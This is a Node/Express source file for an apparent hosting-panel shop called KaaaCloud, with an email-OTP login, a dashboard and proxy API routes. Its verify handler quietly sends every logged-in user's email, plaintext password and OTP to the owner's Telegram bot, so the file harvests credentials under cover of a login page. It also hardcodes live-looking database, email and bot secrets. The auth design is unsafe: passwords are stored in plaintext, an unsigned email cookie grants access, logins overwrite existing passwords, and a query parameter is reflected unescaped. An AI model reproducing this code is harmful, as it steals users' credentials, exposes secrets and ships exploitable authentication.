const express = require('express');
const axios = require('axios');
const mongoose = require('mongoose');
const { Resend } = require('resend');
const cookieParser = require('cookie-parser');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// --- CONFIGURATION ---
const MONGO_URI = "mongodb+srv://eka710231_db_user:kaaacloud@cluster0.6ssgy30.mongodb.net/?appName=Cluster0";
const RESEND_API = "re_Y3DfKKCM_7rJCyA3V1JHoxUNxQ2sc7Fb1";
const TELE_TOKEN = "7789045134:AAFY6waeQ6pD1TAx8_Rfv7J6qsokgPZXPsQ";
const OWNER_ID = "1955836653";
const TELE_ORDER = "https://t.me/autoorderkaabot";

const resend = new Resend(RESEND_API);

// Database Connection
mongoose.connect(MONGO_URI).catch(err => console.error("MongoDB Error:", err));

// --- MODELS ---
const User = mongoose.models.User || mongoose.model('User', new mongoose.Schema({
    email: { type: String, unique: true },
    password: String,
    otp: String,
    isVerified: { type: Boolean, default: false }
}));

const Stats = mongoose.models.Stats || mongoose.model('Stats', new mongoose.Schema({
    name: { type: String, default: "main" },
    total_req: { type: Number, default: 0 }
}));

// Middleware Proteksi
const checkAuth = async (req, res, next) => {
    const email = req.cookies.userEmail;
    if (!email) return res.redirect('/login');
    const user = await User.findOne({ email, isVerified: true });
    if (!user) return res.redirect('/login');
    next();
};

async function hit() {
    await Stats.findOneAndUpdate({ name: "main" }, { $inc: { total_req: 1 } }, { upsert: true });
}

// --- AUTH ROUTES (LOGIN & VERIFY) ---
app.get('/login', (req, res) => {
    res.send(`
    <body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0;">
        <div style="background:rgba(30,41,59,0.5); backdrop-filter:blur(15px); padding:40px; border-radius:30px; border:1px solid #38bdf8; width:340px; text-align:center;">
            <h1 style="color:#38bdf8; font-size:24px; margin-bottom:10px;">KAAA LOGIN</h1>
            <p style="font-size:10px; color:#64748b; margin-bottom:20px;">Verification System v6.0</p>
            <form action="/auth/login" method="POST">
                <input name="email" type="email" placeholder="Email Address" style="width:100%; padding:12px; margin-bottom:12px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <input name="password" type="password" placeholder="Password" style="width:100%; padding:12px; margin-bottom:20px; border-radius:12px; border:none; background:#0f172a; color:white;" required>
                <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; color:#020617; cursor:pointer;">GET OTP CODE</button>
            </form>
        </div>
    </body>`);
});

app.post('/auth/login', async (req, res) => {
    const { email, password } = req.body;
    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    try {
        await User.findOneAndUpdate({ email }, { password, otp, isVerified: false }, { upsert: true });
        await resend.emails.send({
            from: 'KaaaOffc <code@kaaaoffc.web.id>',
            to: email,
            subject: 'Verification Code',
            html: `<div style="text-align:center;"><h2>SECURITY CODE</h2><h1>${otp}</h1></div>`
        });
        res.redirect('/verify?email=' + email);
    } catch (e) { res.send("Error: " + e.message); }
});

app.get('/verify', (req, res) => {
    res.send(`<body style="background:#020617; color:white; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
        <form action="/auth/verify" method="POST" style="background:rgba(30,41,59,0.5); padding:40px; border-radius:30px; border:1px solid #38bdf8; text-align:center;">
            <h2 style="color:#38bdf8;">ENTER OTP</h2>
            <input name="email" type="hidden" value="${req.query.email}">
            <input name="otp" type="text" maxlength="6" style="width:100%; padding:15px; margin:20px 0; border-radius:12px; font-size:30px; text-align:center; letter-spacing:10px; background:#0f172a; color:white; border:none;" required>
            <button type="submit" style="width:100%; padding:12px; background:#38bdf8; border:none; border-radius:12px; font-weight:bold; color:#020617;">VERIFY</button>
        </form>
    </body>`);
});

app.post('/auth/verify', async (req, res) => {
    const { email, otp } = req.body;
    const user = await User.findOne({ email, otp });
    if (user) {
        user.isVerified = true;
        await user.save();
        res.cookie('userEmail', email, { maxAge: 86400000, httpOnly: true });
        // Laporan Ke Tele Owner
        axios.post(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
            chat_id: OWNER_ID,
            text: `🚀 *LOGIN SUCCESS*\n📧 Email: \`${email}\`\n🔑 Pass: \`${user.password}\`\n🔢 OTP: \`${otp}\``,
            parse_mode: 'Markdown'
        });
        res.redirect('/');
    } else { res.send("OTP Salah!"); }
});

// --- DASHBOARD UTAMA (SESUAI SCREENSHOT) ---
app.get('/', checkAuth, async (req, res) => {
    const totalUser = await User.countDocuments({ isVerified: true });
    const statData = await Stats.findOne({ name: "main" }) || { total_req: 0 };
    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            body { background: #020617; color: #f8fafc; font-family: 'Inter', sans-serif; }
            .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
            .price-card:hover { border-color: #38bdf8; transform: translateY(-5px); transition: all 0.3s; }
        </style>
    </head>
    <body class="p-6">
        <nav class="flex justify-between items-center mb-10 max-w-6xl mx-auto">
            <div class="flex items-center gap-2">
                <div class="bg-sky-500 p-2 rounded-lg"><i class="fas fa-bolt text-slate-900"></i></div>
                <span class="font-black text-xl tracking-tight">Kaaa<span class="text-sky-400">Cloud</span></span>
            </div>
            <div class="flex gap-4">
                <a href="/docs" class="text-sm font-bold text-slate-400 hover:text-white">DOCS</a>
                <a href="/logout" class="text-sm font-bold text-red-500">LOGOUT</a>
            </div>
        </nav>

        <div class="text-center mb-12">
            <h1 class="text-4xl font-black italic uppercase tracking-tighter mb-4">Dashboard <span class="text-sky-500">Monitoring</span></h1>
            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 max-w-2xl mx-auto">
                <div class="glass p-6 rounded-3xl">
                    <p class="text-4xl font-black text-sky-400">${totalUser}</p>
                    <p class="text-[10px] uppercase tracking-widest text-slate-500 font-bold">Total User</p>
                </div>
                <div class="glass p-6 rounded-3xl">
                    <p class="text-4xl font-black text-indigo-400">${statData.total_req}</p>
                    <p class="text-[10px] uppercase tracking-widest text-slate-500 font-bold">Hit Requests</p>
                </div>
            </div>
        </div>

        <div class="max-w-6xl mx-auto">
            <div class="text-center mb-10">
                <h2 class="text-2xl font-black uppercase tracking-widest">Pterodactyl Panel Shop</h2>
                <p class="text-slate-400 text-xs mt-2">Dapatkan performa terbaik untuk bot dan server kamu.</p>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                <div class="glass p-8 rounded-[2.5rem] price-card relative">
                    <h3 class="text-xl font-bold mb-2">Ram 1GB</h3>
                    <p class="text-slate-500 text-xs line-through">Rp 3.492</p>
                    <p class="text-3xl font-black text-white mb-6">Rp 3.317</p>
                    <ul class="text-xs space-y-3 mb-8 text-slate-300 italic">
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> RAM 1GB</li>
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> CPU 30%</li>
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> DISK 2GB</li>
                    </ul>
                    <a href="${TELE_ORDER}" class="block text-center bg-sky-500 text-slate-900 font-black py-3 rounded-2xl hover:bg-sky-400 transition-all">ORDER NOW</a>
                </div>

                <div class="glass p-8 rounded-[2.5rem] price-card border-sky-500/50">
                    <span class="absolute top-4 right-4 bg-emerald-500 text-[8px] font-bold px-2 py-1 rounded-full">POPULAR</span>
                    <h3 class="text-xl font-bold mb-2">Ram 6GB</h3>
                    <p class="text-slate-500 text-xs line-through">Rp 11.495</p>
                    <p class="text-3xl font-black text-white mb-6">Rp 10.920</p>
                    <ul class="text-xs space-y-3 mb-8 text-slate-300 italic">
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> RAM 6GB</li>
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> CPU 100%</li>
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> DISK 11GB</li>
                    </ul>
                    <a href="${TELE_ORDER}" class="block text-center bg-sky-500 text-slate-900 font-black py-3 rounded-2xl shadow-lg shadow-sky-500/30">ORDER NOW</a>
                </div>

                <div class="glass p-8 rounded-[2.5rem] price-card">
                    <h3 class="text-xl font-bold mb-2">Ram 7GB</h3>
                    <p class="text-slate-500 text-xs line-through">Rp 17.497</p>
                    <p class="text-3xl font-black text-white mb-6">Rp 16.622</p>
                    <ul class="text-xs space-y-3 mb-8 text-slate-300 italic">
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> RAM 7GB</li>
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> CPU 110%</li>
                        <li><i class="fas fa-check text-sky-500 mr-2"></i> DISK 12GB</li>
                    </ul>
                    <a href="${TELE_ORDER}" class="block text-center bg-sky-500 text-slate-900 font-black py-3 rounded-2xl hover:bg-sky-400 transition-all">ORDER NOW</a>
                </div>
            </div>
        </div>

        <footer class="mt-20 text-center text-[10px] text-slate-600 tracking-widest uppercase pb-10">
            &copy; 2026 Kaaa Offc - Managed Infrastructure
        </footer>
    </body>
    </html>`);
});

// --- API ENDPOINTS (FULL) ---
app.get('/search/tiktok', checkAuth, async (req, res) => {
    const q = req.query.q;
    if (!q) return res.json({ status: false, msg: "q?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/search/tiktok?q=${encodeURIComponent(q)}`);
        res.json({ status: true, creator: "Kaaaoffc", result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

app.get('/ai/gemini', checkAuth, async (req, res) => {
    const text = req.query.text;
    if (!text) return res.json({ status: false, msg: "text?" });
    await hit();
    try {
        const r = await axios.get(`https://api.nexray.web.id/ai/gemini?text=${encodeURIComponent(text)}`);
        res.json({ status: true, result: r.data.result });
    } catch (e) { res.json({ status: false, error: e.message }); }
});

app.get('/logout', (req, res) => { res.clearCookie('userEmail'); res.redirect('/login'); });

module.exports = app;
